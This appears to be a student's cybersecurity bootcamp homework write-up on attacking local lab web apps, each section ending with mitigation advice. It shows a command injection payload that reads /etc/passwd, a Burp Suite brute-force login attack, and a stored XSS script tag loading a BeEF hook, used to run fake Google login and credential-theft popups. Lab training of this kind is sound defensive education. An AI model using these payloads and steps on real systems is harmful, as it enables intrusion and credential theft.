# Unit 15 Homework - Web Vulnerabilities and Hardening.
Web Application 1: Your Wish is My Command Injection
If your Vagrant file is active then Open Oracle VM VirtualBox Manager and start your Virtual Machine.

Start the Terminal in your Virtual Machine.

Run the following command from your Terminal.
cd ./Documents/web-vulns && docker-compose up
Once the Docker Containers are up, Open Firefox Web Browser
Navigate to the following webpage: http://192.168.13.25
Log in with the following credentials:

User name: admin
Password: password
Select the Command Injection option or access the webpage directly at this page: http://192.168.13.25/vulnerabilities/exec/
As per the ping 8.8.8.8 && pwd there are five levels of sub-directories, see below:

![image](https://user-images.githubusercontent.com/93474690/146691175-4d3ec71d-989b-4a3b-9eb0-97bca460f5c6.png)

Based on above, using the dot-dot-slash method ../ need to do it 5 times to access the payloads, that will display the contents of the following directories/files.

/etc/passwd

From Command line in Terminal

![image](https://user-images.githubusercontent.com/93474690/146691184-508b1f46-e52f-4a23-8104-238b9da34f77.png)

From the Web-Browser
8.8.8.8 && cat ../../../../../etc/passwd

![image](https://user-images.githubusercontent.com/93474690/146691198-e63fff85-7bb1-4134-944a-503364ba76b3.png)

/etc/hosts

![image](https://user-images.githubusercontent.com/93474690/146691210-209a2bc0-c621-4c3a-8715-2a85624e21e5.png)

From the Web-Browser
8.8.8.8 && cat ../../../../../etc/passwd

![image](https://user-images.githubusercontent.com/93474690/146691261-1e38726d-3cff-4065-9ddb-99aaaacfb4b6.png)

Recommended Mitigation Strategies
Avoid Command Line Calls Altogether if possible - Use of APIs only where ever possible.
Set up Input Validation - Command Injection vulnerabilities occur when untrusted input is not sanitized correctly. A white list of possible inputs should be created for the system to accepts only the pre-approved inputs, and avoid the following characters: ;
&
|
`
Run with Restricted Permissions - Reduce the number of users to access the database and the secure the locations of all confidential files and the directories.
Web Application 2: A Brute Force to Be Reckoned With
From the Terminal in Vagrant run the command sudo burpsuite to start the Burp Suite Community Edition

Open Firefox browser on Vagrant and navigate to the webpage http://192.168.13.35/ba_insecure_login_1.php

Make sure the FoxyProxy setting on the web browser is set to Burp

![image](https://user-images.githubusercontent.com/93474690/146691281-40883fa2-0373-4640-9ce3-3fcab7c6f60f.png)

This page is an administrative web application that serves as a simple login page. An administrator enters their username and password and selects Login.

Enter the User name: test-user
Enter the Password: password

![image](https://user-images.githubusercontent.com/93474690/146691295-ff8a9701-8ce4-4f1f-94af-7eacd6af2790.png)

Following was displayed in the Burp Suite in Proxy tab under the Intercept - Highlighting the Login and password credentials.
Request to http://192.168.13.35:80

POST /ba_insecure_login_1.php HTTP/1.1
Host: 192.168.13.35
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Connection: close
Referer: http://192.168.13.35/ba_insecure_login_1.php
Cookie: PHPSESSID=6qk327baioj8ioe6p70ff6bvt1; security_level=0
Upgrade-Insecure-Requests: 1

login=test-user&password=test-passwd&form=submit

![image](https://user-images.githubusercontent.com/93474690/146691314-62ea4b43-12a1-4499-8dfd-9f1358b30675.png)

From the web application tool Burp Suite, on the Intercept tab Right click anywhere to send the information to Intruder

Select the Intruder tab, and verify the Target tab:

![image](https://user-images.githubusercontent.com/93474690/146691335-a19d66ae-435c-435d-bb3b-3ef4b62fd86e.png)

Select the Position tab and change the Attack type: to Cluster bomb, also clear all payload positions, except for the login and password credentials.

![image](https://user-images.githubusercontent.com/93474690/146691357-1ac92d0d-6766-482e-855d-67a8877697be.png)

You've been provided with a list of administrators and the breached passwords:

List of Administrators
Breached list of Passwords
Select the Payloads tab, and enter the List of Administrators file provided above into the Payload Options [Simple list] for the set 1.

![image](https://user-images.githubusercontent.com/93474690/146691379-7b52a104-ca56-4f83-9dd7-e8d71ffd0245.png)

Add the passwords from the Breached list of Passwords file provided above into the Payload Options [Simple list] for the set 2.

![image](https://user-images.githubusercontent.com/93474690/146691407-a8c0660e-6a26-4bbd-94cc-7493eab8c3d1.png)

Click the Start attack button to get the results.

Results from the analysis that was completed from the Intruder show that there was one successful login username/password combination. It was user name of "tonystark" and the password "I am Iron Man". Below snapshot displays the Successful login! You really are Iron Man :) in the Response tab.


![image](https://user-images.githubusercontent.com/93474690/146691427-2ed97347-accd-4a9a-9272-f83a059b925a.png)

Recommended Mitigation Strategies
There several ways to monitor and mitigate:

Locking the account after a fixed number of failed attempts.
Making the Usernames and Passwords more complex, and increase the frequency of changing the passwords.
Lock-out the IP address, if there are multiple login attempts.
Brute force site scanners. Scan the logs to see if there was a brute force attempted recently.
Web Application 3: Where's the BeEF?
1. Set up BeEF
From the Terminal in Vagrant run the command sudo beef to start the BeEF
When prompted for a password, enter cybersecurity.
This will kick off the BeEF application and return many details about the application to your terminal.
To access the BeEF GUI, right-click the first URL UI_URL: http://127.0.0.1:3000/ui/panel and select Open Link to open in default browser, or copy the link and open the browser of your choice (Chrome, or Microsoft Edge). Paste it in the address bar and press enter.
When the BeEF webpage opens, login with the following credentials: - Username: beef - Password: feeb
2. Prepare the Replicants Website
From the Terminal in Vagrant navigate to ~/Documents/web-vulns directory.
Run the command sudo docker-compose up
Go to the browser and enter the following in the address bar: http://192.168.13.25/vulnerabilities/xss_s/
Reset the database and the login with the following credentials: - Username: admin - Password: password
3. Start the BeEF hook, and write the payload
From the Terminal copy the BeEF hook: http://127.0.0.1:3000/hook.js
Write the Payload: <script src="http://127.0.0.1:3000/hook.js"></script>
4. Inject this payload
When trying to inject the payload there was an issue found, in the message box field, there was a limit of maxlength="50" character in the source code. Therefore we could not inject the payload.

![image](https://user-images.githubusercontent.com/93474690/146691440-0420486b-b802-40f2-89ff-bdf39bc15a84.png)

Solution: From the Browser press Ctrl+Shift+I for Developer Tools. Under the Element in Chrome or Inspector in Firefox locate the <div class="body_padded"> and in sub categories, locate the <textarea name="mtxMessage" cols="50" rows="3" maxlength="50">. Change the maxlength to any number greater than 50, for example maxlength="75", or just remove this code limit.

![image](https://user-images.githubusercontent.com/93474690/146691463-3dd0ac00-c955-4ff9-936f-1d429a27f723.png)
  
  5. A few BeEF exploits.
First, we'll attempt a social engineering phishing exploit to create a fake Google login pop up. We can use this to capture user credentials.
To access this exploit, select Google Phishing under Social Engineering.
  
  ![image](https://user-images.githubusercontent.com/93474690/146691478-ef443402-569d-451f-9909-bd07c16866af.png)
  
  After selecting this option, the description of the exploit and any dependencies or options are displayed in the panel on the right.
  
  ![image](https://user-images.githubusercontent.com/93474690/146691502-cd744f8b-bc30-4061-bc37-54f62437ae04.png)
  
  To launch the exploit, select Execute in the bottom right corner.

After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google login page.

A victim could easily mistake this for a real login prompt.

Lets see what would happen if a victim entered in their credentials. Use the following credentials to login in to the fake Google page.

Username: hackeruser
Password: hackerpass
  
  ![image](https://user-images.githubusercontent.com/93474690/146691512-1bf67225-fcc1-4ed4-b871-86994535deaf.png)
  
  Return to the BeEF control panel. In the center panel, select the first option. Note that now on the right panel, the username and password have been captured by the attacker.
  
  ![image](https://user-images.githubusercontent.com/93474690/146691532-bb230137-9081-4d01-a6a1-d93df88cd8ad.png)
  
  Task details:

The page you will test is the Replicants Stored XSS application which was used the first day of this unit: http://192.168.13.25/vulnerabilities/xss_s/
The BeEF hook, which was returned after running the sudo beef command was: http://127.0.0.1:3000/hook.js
The payload to inject with this BeEF hook is: <script src="http://127.0.0.1:3000/hook.js"></script>
Social Engineering >> Pretty Theft
  
  ![image](https://user-images.githubusercontent.com/93474690/146691549-0d104db5-36a0-4cb9-923a-695cd2c518fb.png)
  
  ![image](https://user-images.githubusercontent.com/93474690/146691556-1667ca27-2959-4560-a477-047488f0df70.png)
  
  ![image](https://user-images.githubusercontent.com/93474690/146691565-6602fd57-62cd-437a-82c5-8666e8dd4c57.png)
  
  Social Engineering >> Fake Notification Bar
  
  ![image](https://user-images.githubusercontent.com/93474690/146691578-cbb6f0a8-fca5-4059-a53e-f9eec04854f7.png)
  
  Host >> Get Geolocation (Third Party)
  
  ![image](https://user-images.githubusercontent.com/93474690/146691618-93099dcb-3be0-45f2-8f5b-cf2f564d4ac7.png)
  
  Recommended Mitigation Strategies
Keep the system up to date Restore the VM to a virgin state on a regular basis (once a week, or once a month). Also change your passwords regularly, assuming that you have been compromised.
